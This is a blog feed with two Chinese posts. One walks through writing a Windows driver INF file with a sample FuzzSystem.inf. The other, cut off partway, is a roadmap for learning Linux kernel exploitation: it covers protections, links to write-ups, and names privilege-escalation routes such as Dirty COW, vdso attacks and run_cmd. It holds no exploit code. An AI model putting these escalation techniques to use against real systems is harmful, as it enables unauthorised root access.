<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-11-13T08:53:45.711Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>PwnHt</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>inf文件编写</title>
    <link href="http://yoursite.com/2020/11/09/inf%E6%96%87%E4%BB%B6%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2020/11/09/inf文件编写/</id>
    <published>2020-11-09T10:58:37.000Z</published>
    <updated>2020-11-13T08:53:45.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在做windows驱动开发的时候遇到一个很大的问题就是inf文件编写，因为vs不会帮你生成好，如果直接编译的话会报错</p><p><img src="/2020/11/09/inf文件编写/vs_error.png" alt=""></p><p>然后就有以下几种方案：</p><ul><li>删除inf文件</li><li>编写inf文件</li></ul><h1 id="0x01-删除inf文件"><a href="#0x01-删除inf文件" class="headerlink" title="0x01 删除inf文件"></a>0x01 删除inf文件</h1><p>删除inf文件需要在vs的项目中删除</p><p><img src="/2020/11/09/inf文件编写/delete_inf.png" alt=""></p><p>位置如上，右击删除就行了，之后编译，就会生成sys</p><p><img src="/2020/11/09/inf文件编写/compile.png" alt=""></p><p>之后就是载入问题了，大概有以下两种方式</p><ul><li>利用现成的载入驱动的软件，如osrloader</li><li>自己编写载入代码，参考 <a href="https://github.com/microsoft/Windows-driver-samples/blob/master/general/ioctl/wdm/exe/install.c" target="_blank" rel="noopener">https://github.com/microsoft/Windows-driver-samples/blob/master/general/ioctl/wdm/exe/install.c</a></li></ul><h1 id="0x02-编写inf文件"><a href="#0x02-编写inf文件" class="headerlink" title="0x02 编写inf文件"></a>0x02 编写inf文件</h1><p>先附上自己编写的inf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">;</span><br><span class="line">; FuzzSystem.inf</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">[Version]</span><br><span class="line">Signature=&quot;$WINDOWS NT$&quot;</span><br><span class="line">Class=System</span><br><span class="line">ClassGuid=&#123;4d36e97d-e325-11ce-bfc1-08002be10318&#125;</span><br><span class="line">Provider=%ManufacturerName%</span><br><span class="line">DriverVer = 11/09/2020,20.33.5.988</span><br><span class="line">CatalogFile=FuzzSystem.cat</span><br><span class="line">PnpLockDown=1</span><br><span class="line"></span><br><span class="line">[DestinationDirs]</span><br><span class="line">DefaultDestDir = 12</span><br><span class="line">FuzzSystem.DriverFiles = 12</span><br><span class="line"></span><br><span class="line">[SourceDisksNames]</span><br><span class="line">1 = %Disk1%</span><br><span class="line"></span><br><span class="line">[SourceDisksFiles]</span><br><span class="line">FuzzSystem.sys = 1</span><br><span class="line"></span><br><span class="line">[DefaultInstall]</span><br><span class="line">OptionDesc = %ServiceDesc%</span><br><span class="line">CopyFiles = FuzzSystem.DriverFiles</span><br><span class="line"></span><br><span class="line">[FuzzSystem.DriverFiles]</span><br><span class="line">FuzzSystem.sys</span><br><span class="line"></span><br><span class="line">[DefaultInstall.Services]</span><br><span class="line">AddService = %ServiceName%,,FuzzSystem.Service</span><br><span class="line"></span><br><span class="line">[FuzzSystem.Service]</span><br><span class="line">DisplayName    = %ServiceName%</span><br><span class="line">Description    = %ServiceDesc%</span><br><span class="line">ServiceBinary  = %12%\FuzzSystem.sys</span><br><span class="line">ServiceType    = 1     </span><br><span class="line">StartType      = 2     </span><br><span class="line">ErrorControl   = 1  </span><br><span class="line"></span><br><span class="line">[DefaultUninstall]</span><br><span class="line">DelFiles   = FuzzSystem.DriverFiles</span><br><span class="line"></span><br><span class="line">[DefaultUninstall.Services]</span><br><span class="line">DelService = %ServiceName%,0x200</span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">ManufacturerName = &quot;pwnht&quot;</span><br><span class="line">ServiceDesc = &quot;Example File System Driver&quot;</span><br><span class="line">ServiceName = &quot;FuzzSystem&quot;</span><br><span class="line">ParameterPath = &quot;SYSTEM\CurrentControlSet\Services\FuzzSystem\Parameters&quot;</span><br><span class="line">Disk1       = &quot;Example File System Driver CD&quot;</span><br></pre></td></tr></table></figure><p>inf文件分为诸多节，每一个节都有名字并用[]标识，inf文件通常包含以下各节</p><ul><li>Version(必须)</li><li>DestinationDirs (可选的，但建议使用)</li><li>SourceDisksNames (必需)</li><li>SourceDisksFiles (必需)</li><li>DefaultInstall (必需)</li><li>DefaultInstall (必需)</li><li>ServiceInstall (必需)</li><li>DefaultUninstall (可选)</li><li>DefaultUninstall (可选)</li><li>Strings (必需)</li></ul><h2 id="0x00-Version"><a href="#0x00-Version" class="headerlink" title="0x00 Version"></a>0x00 Version</h2><p>参考  <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-version-section" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-version-section</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[Version]</span><br><span class="line"> </span><br><span class="line">Signature=&quot;signature-name&quot;</span><br><span class="line">[Class=class-name]</span><br><span class="line">[ClassGuid=&#123;nnnnnnnn-nnnn-nnnn-nnnn-nnnnnnnnnnnn&#125;]</span><br><span class="line">[Provider=%INF-creator%]</span><br><span class="line">[ExtensionId=&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;]</span><br><span class="line">[LayoutFile=filename.inf [,filename.inf]... ]  (Windows 2000 and Windows XP)</span><br><span class="line">[CatalogFile=filename.cat]</span><br><span class="line">[CatalogFile.nt=unique-filename.cat]</span><br><span class="line">[CatalogFile.ntx86=unique-filename.cat]</span><br><span class="line">[CatalogFile.ntia64=unique-filename.cat]  (Windows XP and later versions of Windows)</span><br><span class="line">[CatalogFile.ntamd64=unique-filename.cat]  (Windows XP and later versions of Windows)</span><br><span class="line">[CatalogFile.ntarm=unique-filename.cat]  (Windows 8 and later versions of Windows)</span><br><span class="line">[CatalogFile.ntarm64=unique-filename.cat]  (Windows XP and later versions of Windows)</span><br><span class="line"></span><br><span class="line">DriverVer=mm/dd/yyyy,w.x.y.z</span><br><span class="line">[PnpLockDown=0|1] (Windows Vista and later versions of Windows)</span><br><span class="line">[DriverPackageDisplayName=%driver-package-description%]</span><br><span class="line">[DriverPackageType=PackageType]</span><br></pre></td></tr></table></figure><p>CatalogFile键值是用来指定数字签名的  待补。。。。</p><p>这里需要注意的键值是PnpLockDown这个键值只有0和1</p><p>指定即插即用 (PnP) 是否阻止应用程序直接修改驱动程序包的 INF 文件指定的文件。 如果 <strong>PnpLockDown</strong> 指令设置为1，则 PnP 会阻止应用程序直接修改由 INF <strong>CopyFiles</strong> 指令复制的文件。 否则，如果指令未包含在 INF 文件中，或者指令的值设置为零，则具有管理员权限的应用程序可以直接修改这些文件。</p><h2 id="0x01-DestinationDirs"><a href="#0x01-DestinationDirs" class="headerlink" title="0x01 DestinationDirs"></a>0x01 DestinationDirs</h2><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-destinationdirs-section" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-version-section</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DestinationDirs]</span><br><span class="line"></span><br><span class="line">[DefaultDestDir=dirid[,subdir]] </span><br><span class="line">[file-list-section=dirid[,subdir]]...</span><br></pre></td></tr></table></figure><p>DefaultDestDir =dirid[ ，subdir]<br>指定对文件的所有复制、删除和/或重命名操作的默认目标目录，如果没有显式列出操作目录（可以自定义文件列表节显式指定，如FuzzSystem.DriverFiles节），默认在这个目录下操作</p><p>dirid一般为数字代表windows一些常用的路径</p><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/using-dirids" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/using-dirids</a></p><table><thead><tr><th>“值”</th><th>目标目录</th></tr></thead><tbody><tr><td><strong>2001</strong></td><td><em>SourceDrive**</em>： **<em>pathname</em> (用于安装 INF 文件的目录)</td></tr><tr><td><strong>10</strong></td><td>Windows 目录。这等同于 <em>% SystemRoot%</em>。</td></tr><tr><td><strong>11</strong></td><td>系统目录。这等效于<em>%SystemRoot%</em> <strong>\</strong> windows 2000 和更高版本的 windows 的% SystemRoot%<em>system32</em> 。</td></tr><tr><td><strong>12</strong></td><td>驱动程序目录。这等效于<em>%SystemRoot%</em> <strong>\</strong> <em>system32</em> <strong>\</strong> windows 2000 和更高版本的 windows 的% SystemRoot% system32<em>驱动程序</em>。</td></tr><tr><td><strong>13</strong></td><td>驱动程序包的 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/driver-store" target="_blank" rel="noopener">驱动程序存储</a> 目录。对于 Windows 8.1 及更高版本的 Windows，指定导入驱动程序包的驱动程序存储目录的路径。请勿在<strong>DestinationDirs</strong>包括<em>dirid</em> 13 的文件上使用<a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delfiles-directive" target="_blank" rel="noopener">DelFiles</a> 。对于应用到此文件的条目，文件的 <strong>SourceDiskFiles</strong> 节中的可选子目录必须与 <strong>DestinationDirs</strong> 节中的子目录匹配。不要使用 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-copyfiles-directive" target="_blank" rel="noopener">CopyFiles</a> 重命名 <strong>DestinationDirs</strong> 包括 <em>dirid</em> 13 的文件。</td></tr><tr><td><strong>17</strong></td><td>INF 文件目录</td></tr><tr><td><strong>18</strong></td><td>帮助目录</td></tr><tr><td><strong>20</strong></td><td>字体目录</td></tr><tr><td><strong>21</strong></td><td>查看器目录</td></tr><tr><td>23</td><td>颜色目录 (ICM) (<em>不</em> 用于安装打印机驱动程序)</td></tr><tr><td><strong>随时</strong></td><td>系统磁盘的根目录。这是安装了 Windows 文件的磁盘的根目录。 例如，如果 <em>dirid</em> 10 是 “<em>C:\winnt</em>“，则 <em>dirid</em> 24 为 “<em>C：\</em>“。</td></tr><tr><td><strong>25</strong></td><td>共享目录</td></tr><tr><td><strong>30</strong></td><td>启动磁盘（也称为 “ARC 系统分区”）的根目录。 (这与 <em>dirid</em> 24 ) 所表示的目录可能相同，也可能不相同。</td></tr><tr><td><strong>50</strong></td><td>系统目录这等同于<em>% SystemRoot%</em> <strong>\</strong> <em>系统</em>。</td></tr><tr><td><strong>51</strong></td><td>假脱机目录 (<em>不</em> 用于安装打印机驱动程序−请参阅 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/print/printer-dirids" target="_blank" rel="noopener">printer Dirids</a>)</td></tr><tr><td><strong>52</strong></td><td>后台处理驱动程序目录 (<em>不</em> 用于安装打印机驱动程序)</td></tr><tr><td><strong>53</strong></td><td>用户配置文件目录</td></tr><tr><td><strong>54</strong></td><td><em>Ntldr.exe</em>和<em>Osloader.exe</em>所在的目录</td></tr><tr><td><strong>55</strong></td><td>打印处理器目录 (<em>不</em> 用于安装打印机驱动程序)</td></tr><tr><td><strong>-1</strong></td><td>绝对路径</td></tr></tbody></table><p>从16384到32767的<em>Dirid</em>值保留给特殊 shell 文件夹。 下表显示了这些文件夹的 <em>dirid</em> 值。</p><table><thead><tr><th>“值”</th><th>Shell 特殊文件夹</th></tr></thead><tbody><tr><td><strong>16406</strong></td><td><em>所有 Settings\all users\start 菜单</em></td></tr><tr><td><strong>16407</strong></td><td><em>所有 Settings\all users\start Menu\Programs</em></td></tr><tr><td><strong>16408</strong></td><td><em>所有 Settings\all users\start Menu\Programs\Startup</em></td></tr><tr><td><strong>16409</strong></td><td><em>所有 Users\Desktop</em></td></tr><tr><td><strong>16415</strong></td><td><em>所有 Users\Favorites</em></td></tr><tr><td><strong>16419</strong></td><td><em>所有 Users\Application 数据</em></td></tr><tr><td><strong>16422</strong></td><td><em>程序文件</em></td></tr><tr><td><strong>16425</strong></td><td><em>%SystemRoot%\SysWOW64</em></td></tr><tr><td><strong>16426</strong></td><td><em>%ProgramFiles(x86)%</em></td></tr><tr><td><strong>16427</strong></td><td><em>程序 Files\Common</em></td></tr><tr><td><strong>16428</strong></td><td><em>% ProgramFiles (x86) % \ Common</em></td></tr><tr><td><strong>16429</strong></td><td><em>所有 Users\Templates</em></td></tr><tr><td><strong>16430</strong></td><td><em>所有 Users\Documents</em></td></tr></tbody></table><h2 id="0x02-SourceDisksNames"><a href="#0x02-SourceDisksNames" class="headerlink" title="0x02 SourceDisksNames"></a>0x02 SourceDisksNames</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[SourceDisksNames] |</span><br><span class="line">[SourceDisksNames.x86] | </span><br><span class="line">[SourceDisksNames.arm] | (Windows 8 and later versions of Windows)</span><br><span class="line">[SourceDisksNames.arm64] | (Windows 10 version 1709 and later versions of Windows)</span><br><span class="line">[SourceDisksNames.ia64] | (Windows XP and later versions of Windows)</span><br><span class="line">[SourceDisksNames.amd64] (Windows XP and later versions of Windows)</span><br><span class="line"></span><br><span class="line">diskid = disk-description[,tag-or-cab-file] |</span><br><span class="line">diskid = disk-description[,[tag-or-cab-file][,[unused][,path]]] |</span><br><span class="line">diskid = disk-description[,[tag-or-cab-file],[unused],[path][,flags]] |</span><br><span class="line">diskid = disk-description[,[tag-or-cab-file],[unused],[path],[flags][,tag-file]]  (Windows XP and later versions of Windows)</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-sourcedisksnames-section" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-sourcedisksnames-section</a></p><p>大概是将一个cab文件或者路径虚拟成一个磁盘，若未显式指明路径或者cab文件，则为inf文件所在的当前路径</p><h2 id="0x03-SourceDisksFiles"><a href="#0x03-SourceDisksFiles" class="headerlink" title="0x03 SourceDisksFiles"></a>0x03 SourceDisksFiles</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SourceDisksFiles] | </span><br><span class="line">[SourceDisksFiles.x86] | </span><br><span class="line">[SourceDisksFiles.arm] | (Windows 8 and later versions of Windows)</span><br><span class="line">[SourceDisksFiles.arm64] | (Windows 10 version 1709 and later versions of Windows)</span><br><span class="line">[SourceDisksFiles.ia64] | (Windows XP and later versions of Windows)</span><br><span class="line">[SourceDisksFiles.amd64] (Windows XP and later versions of Windows)</span><br><span class="line"></span><br><span class="line">filename=diskid[,[ subdir][,size]]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-sourcedisksfiles-section" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-sourcedisksfiles-section</a></p><p>指明安装需要文件的位置，还有size，感觉这是个攻击面  哈哈哈</p><h2 id="0x04-DefaultInstall"><a href="#0x04-DefaultInstall" class="headerlink" title="0x04 DefaultInstall"></a>0x04 DefaultInstall</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[DefaultInstall] | </span><br><span class="line">[DefaultInstall.nt] | </span><br><span class="line">[DefaultInstall.ntx86] | </span><br><span class="line">[DefaultInstall.ntarm] | (Windows 8 and later versions of Windows)</span><br><span class="line">[DefaultInstall.ntarm64]  (Windows 10 version 1709 and later versions of Windows)</span><br><span class="line">[DefaultInstall.ntia64] | (Windows XP and later versions of Windows)</span><br><span class="line">[DefaultInstall.ntamd64]  (Windows XP and later versions of Windows)</span><br><span class="line"> </span><br><span class="line">[CopyFiles=@filename | file-list-section[,file-list-section] ...]</span><br><span class="line">[CopyINF=filename1.inf[,filename2.inf]...]</span><br><span class="line">[AddReg=add-registry-section[,add-registry-section]...]</span><br><span class="line">[Include=filename1.inf[,filename2.inf]...]</span><br><span class="line">[Needs=inf-section-name[,inf-section-name]...]</span><br><span class="line">[Delfiles=file-list-section[,file-list-section]...]</span><br><span class="line">[Renfiles=file-list-section[,file-list-section]...]</span><br><span class="line">[DelReg=del-registry-section[,del-registry-section]...]</span><br><span class="line">[BitReg=bit-registry-section[,bit-registry-section]...]</span><br><span class="line">[ProfileItems=profile-items-section[,profile-items-section]...]</span><br><span class="line">[UpdateInis=update-ini-section[,update-ini-section]...]</span><br><span class="line">[UpdateIniFields=update-inifields-section[,update-inifields-section]...]</span><br><span class="line">[Ini2Reg=ini-to-registry-section[,ini-to-registry-section]...]</span><br><span class="line">[RegisterDlls=register-dll-section[,register-dll-section]...]</span><br><span class="line">[UnregisterDlls=unregister-dll-section[,unregister-dll-section]...] ...</span><br></pre></td></tr></table></figure><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-defaultinstall-section" target="_blank" rel="noopener"> https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-defaultinstall-section</a></p><p>当用户右键安装时就会运行这一节的内容，目前用到的还少，待补</p><h3 id="0x00-DefaultInstall-Services"><a href="#0x00-DefaultInstall-Services" class="headerlink" title="0x00 DefaultInstall.Services"></a>0x00 DefaultInstall.Services</h3><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-addservice-directive" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-addservice-directive</a></p><p>DefaultInstall指定服务的一些设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DDInstall.Services] </span><br><span class="line"> </span><br><span class="line">AddService=ServiceName,[flags],service-install-section</span><br><span class="line">                     [,event-log-install-section[,[EventLogType][,EventName]]]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>主要说一下 service-install-section</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[service-install-section]</span><br><span class="line"> </span><br><span class="line">[DisplayName=name]</span><br><span class="line">[Description=description-string]</span><br><span class="line">ServiceType=type-code</span><br><span class="line">StartType=start-code</span><br><span class="line">ErrorControl=error-control-level</span><br><span class="line">ServiceBinary=path-to-service</span><br><span class="line">[StartName=driver-object-name]</span><br><span class="line">[AddReg=add-registry-section[, add-registry-section] ...]</span><br><span class="line">[DelReg=del-registry-section[, del-registry-section] ...]</span><br><span class="line">[BitReg=bit-registry-section[,bit-registry-section] ...]</span><br><span class="line">[LoadOrderGroup=load-order-group-name]</span><br><span class="line">[Dependencies=depend-on-item-name[,depend-on-item-name]</span><br><span class="line">[Security=&quot;security-descriptor-string&quot;]...]</span><br><span class="line">[ServiceSidType=value]</span><br><span class="line">[DelayedAutoStart=true/false]</span><br><span class="line">[AddTrigger=service-trigger-install-section[, service-trigger-install-section, ...]]</span><br></pre></td></tr></table></figure><h4 id="0x00-ServiceType"><a href="#0x00-ServiceType" class="headerlink" title="0x00 ServiceType"></a>0x00 ServiceType</h4><table><thead><tr><th style="text-align:left">值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x00000001</td><td style="text-align:left">(设备驱动程序服务 SERVICE_KERNEL_DRIVER)</td></tr><tr><td style="text-align:left">0x00000002</td><td style="text-align:left">SERVICE_FILE_SYSTEM_DRIVER (文件系统或文件系统筛选器驱动程序服务)</td></tr><tr><td style="text-align:left">0x00000010</td><td style="text-align:left">SERVICE_WIN32_OWN_PROCESS (Microsoft Win32 服务，该服务在其自己的进程中运行)</td></tr><tr><td style="text-align:left">0x00000020</td><td style="text-align:left">共享进程 (Win32 服务 SERVICE_WIN32_SHARE_PROCESS)</td></tr></tbody></table><h4 id="0x01-StartType"><a href="#0x01-StartType" class="headerlink" title="0x01 StartType"></a>0x01 StartType</h4><p>指定何时启动驱动程序作为以下数值之一（用 decimal 或表示），如下面的列表所示，采用十六进制表示法。</p><table><thead><tr><th style="text-align:left">值</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">0x00000000</td><td style="text-align:left">SERVICE_BOOT_START</td></tr><tr><td style="text-align:left">0x00000001</td><td style="text-align:left">SERVICE_SYSTEM_START</td></tr><tr><td style="text-align:left">0x00000002</td><td style="text-align:left">SERVICE_AUTO_START</td></tr><tr><td style="text-align:left">0x00000003</td><td style="text-align:left">SERVICE_DEMAND_START</td></tr><tr><td style="text-align:left">0x00000004</td><td style="text-align:left">SERVICE_DISABLED</td></tr></tbody></table><h4 id="0x02-AddReg"><a href="#0x02-AddReg" class="headerlink" title="0x02 AddReg"></a>0x02 AddReg</h4><p>关于注册表相关  待补</p><h2 id="0x05-DefaultUninstall"><a href="#0x05-DefaultUninstall" class="headerlink" title="0x05 DefaultUninstall"></a>0x05 DefaultUninstall</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DefaultUninstall]</span><br><span class="line">DelFiles   = ExampleFileSystem.DriverFiles</span><br><span class="line">DelReg     = ExampleFileSystem.DelRegistry</span><br></pre></td></tr></table></figure><p>如果驱动可以卸载可以用DelFiles删除文件，DelReg清除注册表</p><p>参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delfiles-directive" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delfiles-directive</a> 和 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delreg-directive" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delreg-directive</a></p><h4 id="0x00-DefaultUninstall-Services"><a href="#0x00-DefaultUninstall-Services" class="headerlink" title="0x00 DefaultUninstall.Services"></a>0x00 DefaultUninstall.Services</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DefaultUninstall.Services]</span><br><span class="line">DelService = %ServiceName%,0x200</span><br></pre></td></tr></table></figure><p>删除服务 参考 <a href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delservice-directive" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/install/inf-delservice-directive</a></p><h1 id="0x06-Strings"><a href="#0x06-Strings" class="headerlink" title="0x06 Strings"></a>0x06 Strings</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Strings] | </span><br><span class="line">[Strings.LanguageID] ...</span><br><span class="line"> </span><br><span class="line">strkey1 = [&quot;]some string[&quot;]</span><br><span class="line">strkey2 = &quot;    string-with-leading-or-trailing-whitespace     &quot;  | </span><br><span class="line">          &quot;very-long-multiline-string&quot; | </span><br><span class="line">          &quot;string-with-semicolon&quot; | </span><br><span class="line">          &quot;string-ending-in-backslash&quot; |</span><br><span class="line">          &quot;&quot;double-quoted-string-value&quot;&quot;</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure><p>定义一些字符串供其他节使用</p>]]></content>
    
    <summary type="html">
    
      这里总结一下inf模板文件编写
    
    </summary>
    
    
    
      <category term="windows,drivers" scheme="http://yoursite.com/tags/windows-drivers/"/>
    
  </entry>
  
  <entry>
    <title>linux内核路线总结</title>
    <link href="http://yoursite.com/2020/08/12/linux%E5%86%85%E6%A0%B8%E8%B7%AF%E7%BA%BF%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/08/12/linux内核路线总结/</id>
    <published>2020-08-12T10:32:49.000Z</published>
    <updated>2020-08-12T13:15:35.997Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>回顾过去已经学Linux一年多了，学了很多，也走了许多弯路，一直没有总结，今天补上</p><h1 id="0x01-学前基础"><a href="#0x01-学前基础" class="headerlink" title="0x01 学前基础"></a>0x01 学前基础</h1><p> 学习kernel一个重要的前提就是对操作系统的理解，可以看看《操作系统-精髓与原理》这本书。如果，你看不下去kernel的代码，大概率是由于操作系统的基础不够，不知道kernel为什么要这么做，说到底kernel就是操作系统的实现，当你对操作系统有一个整体的认识的时候，在看kernel的某一部分代码的时候，就知道kernel为什么这么实现，他解决了什么问题，用了什么机制。</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>参考我的写的 <strong>CVE-2020-8647分析</strong> 文章的环境搭建，他可以构建一个完整文件系统，你可以用ssh登录他，也可以配合远程vscode写exp，然后，编译比较方便，也比较舒服，这个是基于 <strong>debootstrap</strong> 如果你发现镜像下载比较慢，可以考虑国内的源，具体操作百度<strong>debootstrap</strong> 用法即可</p><h1 id="0x03-保护机制"><a href="#0x03-保护机制" class="headerlink" title="0x03 保护机制"></a>0x03 保护机制</h1><p>linux kernel主要的保护方式有4种，cannary ，kaslr，smep，smap这个网上文章有很多不在赘述</p><h1 id="0x04-漏洞类型及利用方式"><a href="#0x04-漏洞类型及利用方式" class="headerlink" title="0x04 漏洞类型及利用方式"></a>0x04 漏洞类型及利用方式</h1><p>参考 <a href="https://xz.aliyun.com/u/20469" target="_blank" rel="noopener">https://xz.aliyun.com/u/20469</a></p><p>这几篇系列文章包括了大部分漏洞类型及利用方式，还差ret2dir参考下面这两篇文章</p><ul><li><a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xJDchen/p/6143102.html</a></li><li><a href="https://www.anquanke.com/post/id/185408" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185408</a></li></ul><p>之后还有著名的脏牛漏洞利用方式，攻击vdso，然后还有可以call 内核函数 run_cmd 虽然他不能直接给一个root的shell，但是，他可以root权限执行一个系统命令，间接提权应该不是难事</p><p>当然还有一些硬核的提权的方式，比如你能控制某一个物理页，你就可以通过改这个物理页来改变其他程序的代码，从而达到提权的效果，不太常用一般用不到</p><h1 id="0x05-通用堆喷技巧"><a href="#0x05-通用堆喷技巧" class="headerlink" title="0x05 通用堆喷技巧"></a>0x05 通用堆喷技巧</h1><p>参考这篇文章:</p><p><a href="https://xz.aliyun.com/t/2814" target="_blank" 